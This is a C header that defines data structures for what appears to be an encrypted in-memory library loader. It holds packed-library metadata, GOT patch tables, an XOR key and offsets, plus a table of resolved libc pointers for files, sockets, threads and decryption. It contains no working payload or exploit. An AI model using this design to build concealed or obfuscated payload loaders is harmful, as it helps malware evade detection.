#ifndef SOME_HEADER_GUARD_WITH_UNIQUE_NAME
#define SOME_HEADER_GUARD_WITH_UNIQUE_NAME
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>   // For sysconf
#include <dlfcn.h>    // For dlsym

#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <pthread.h>

typedef struct malibrary{
    size_t n_got_mappings;  // number of GOT mappings
    uint64_t *got_offsets;  // list of GOT offsets (where the GOT entry is located)
    uint64_t *got_targets;  // list of GOT targets (where the GOT entry should point)
    char *data;             // the actual data of the library
    size_t data_length;     // the size of the data
    size_t entry_offset;    // the offset of the entry function within the data
    uint64_t key;           // the key to encrypt/decrypt the data
    uint64_t elf_offset_data;  // the offset of the data within the packed and compiled loader 
    uint64_t elf_offset_key;   // the offset of the key within the packed and compiled loader
} MaLib;

typedef struct globals{
    void (*exit)(int __status);

    // strings
    char *(*getcwd)(char *buf, size_t size);
    int (*snprintf)(char *__s, size_t __maxlen, const char * __format, ...);
    int (*fprintf)(FILE *__restrict__ __stream, const char *__restrict__ __format, ...);
    size_t (*strlen)(const char *__s);

    // memory
    void *(*memcpy)(void *__restrict__ __dest, const void *__restrict__ __src, size_t __n);

    // files
    char *(*realpath)(const char *restrict path, char *restrict resolved_path);
    FILE *(*fopen)(const char *__restrict__ __filename, const char *__restrict__ __modes);
    size_t (*fread)(void *__restrict__ __ptr, size_t __size, size_t __n, FILE *__restrict__ __stream);
    int (*fseek)(FILE *__stream, long __off, int __whence);
    long (*ftell)(FILE *__stream);
    int (*fclose)(FILE *__stream);
    void (*rewind)(FILE *__stream);
    ssize_t (*write)(int __fd, const void *__buf, size_t __n);
    int (*close)(int __fd);

    // heap
    void *(*malloc)(size_t __size);
    void (*free)(void *__ptr);

    // network
    uint32_t (*htonl)(uint32_t __hostlong);
    uint16_t (*htons)(uint16_t __hostshort);
    int (*socket)(int __domain, int __type, int __protocol);
    int (*setsockopt)(int __fd, int __level, int __optname, const void *__optval, socklen_t __optlen);
    int (*bind)(int __fd, const struct sockaddr *__addr, socklen_t __len);
    int (*listen)(int __fd, int __n);
    int (*accept)(int __fd, struct sockaddr *__restrict__ __addr, socklen_t *__restrict__ __addr_len);
    
    // threads
    int (*pthread_create)(pthread_t *__restrict__ __newthread, const pthread_attr_t *__restrict__ __attr, void *(*__start_routine)(void *), void *__restrict__ __arg);
    void (*pthread_exit)(void *__retval);
    
    // fds
    FILE *stdout;
    FILE *stderr;

    // misc
    int (*rand)(void);

    // global variables
    char * exec_path;
    void * lib_mem;
    MaLib * lib;

    // custom functions
    void (*xor_memory)(void * memory, size_t len, char*key);

} Globals;

#endif
